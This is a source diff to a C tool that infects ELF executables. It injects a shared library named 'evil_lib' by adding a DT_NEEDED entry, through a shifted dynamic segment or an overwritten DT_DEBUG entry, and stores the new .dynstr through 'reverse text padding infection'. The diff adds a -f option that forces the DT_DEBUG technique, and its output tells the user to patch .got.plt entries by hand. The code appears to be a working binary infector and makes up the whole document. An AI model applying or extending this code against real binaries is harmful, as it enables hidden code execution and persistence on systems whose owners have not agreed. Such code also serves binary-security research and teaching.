@@ -45,6 +45,7 @@
 
 #define TMP "xyz.tmp"
 
+bool dt_debug_method = false;
 bool calculate_new_dynentry_count(elfobj_t *, uint64_t *, uint64_t *);
 
 /*
@@ -59,8 +60,8 @@ modify_dynamic_segment(elfobj_t *target, uint64_t dynstr_vaddr,
 {
 	bool use_debug_entry = false;
 	bool res;
-	uint64_t dcount, dpadsz;
-	uint64_t o_dcount = 0, index = 0;
+	uint64_t dcount, dpadsz, index;
+	uint64_t o_dcount = 0, d_index = 0, dt_debug_index = 0;
 	elf_dynamic_entry_t d_entry;
 	elf_dynamic_iterator_t d_iter;
 	elf_error_t error;
@@ -82,6 +83,12 @@ modify_dynamic_segment(elfobj_t *target, uint64_t dynstr_vaddr,
 		fprintf(stderr, "Not enough room to shift dynamic entries forward"
 		    ", falling back to overwriting DT_DEBUG with DT_NEEDED\n");
 		use_debug_entry = true;
+	} else if (dt_debug_method == true) {
+		fprintf(stderr, "Forcing DT_DEBUG overwrite. This technique will not give\n"
+		    "your injected shared library functions precedence over any other libraries\n"
+		    "and will therefore require you to manually overwrite the .got.plt entries to\n"
+		    "point at your custom shared library function(s)\n");
+		use_debug_entry = true;
 	}
 	elf_dynamic_iterator_init(target, &d_iter);
 	for (;;) {
@@ -100,8 +107,11 @@ modify_dynamic_segment(elfobj_t *target, uint64_t dynstr_vaddr,
 		}
 		n->value = d_entry.value;
 		n->tag = d_entry.tag;
+		if (n->tag == DT_DEBUG)	{
+			dt_debug_index = d_index;
+		}
 		TAILQ_INSERT_TAIL(&dtags_list, n, _linkage);
-		dcount++;
+		d_index++;
 	}
 
 	/*
@@ -131,12 +141,18 @@ modify_dynamic_segment(elfobj_t *target, uint64_t dynstr_vaddr,
 		}
 		index = 1;
 	}
+
 	TAILQ_FOREACH(current, &dtags_list, _linkage) {
 		if (use_debug_entry == true && current->tag == DT_DEBUG) {
-			printf("!!! Falling back to overwriting DT_DEBUG technique\n");
+			if (dt_debug_index == 0) {
+				printf("Could not find DT_DEBUG entry, injection has failed\n");
+				return false;
+			}
+			printf("%sOverwriting DT_DEBUG at index: %zu\n",
+			    dcount == 0 ? "Falling back to " : "", dt_debug_index);
 			d_entry.tag = DT_NEEDED;
 			d_entry.value = evil_offset;
-			res = elf_dynamic_modify(target, index, &d_entry, true, &error);
+			res = elf_dynamic_modify(target, dt_debug_index, &d_entry, true, &error);
 			if (res == false) {
 				fprintf(stderr, "elf_dynamic_modify failed: %s\n",
 				    elf_error_msg(&error));
@@ -157,6 +173,9 @@ modify_dynamic_segment(elfobj_t *target, uint64_t dynstr_vaddr,
 			    d_entry.value, index);
 			goto next;
 		}
+#if 0
+		printf("Updating dyn[%zu]\n", index);
+#endif
 		d_entry.tag = current->tag;
 		d_entry.value = current->value;
 		res = elf_dynamic_modify(target, index, &d_entry, true, &error);
@@ -221,12 +240,18 @@ int main(int argc, char **argv)
 	ssize_t b;
 
 	if (argc < 3) {
-		printf("Usage: %s <lib.so> <target>\n", argv[0]);
+		printf("Usage: %s [-f] <lib.so> <target>\n", argv[0]);
+		printf("-f	Force DT_DEBUG overwrite technique\n");
 		exit(0);
 	}
-	evil_lib = argv[1];
-	executable = argv[2];
-
+	if (argv[1][0] == '-' && argv[1][1] == 'f') {
+		dt_debug_method = true;
+		evil_lib = argv[2];
+		executable = argv[3];
+	} else {
+		evil_lib = argv[1];
+		executable = argv[2];
+	}
 	res = elf_open_object(executable, &target,
 	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error);
 	if (res == false) {
@@ -265,6 +290,7 @@ int main(int argc, char **argv)
 		printf("elf_segment_modify failed: %s\n", elf_error_msg(&error));
 		goto done;
 	}
+	printf("Creating reverse text padding infection to store new .dynstr section\n");
 	elf_segment_iterator_init(&target, &p_iter);
 	while (elf_segment_iterator_next(&p_iter, &segment) == ELF_ITER_OK) {
 		if (text_found == true) {
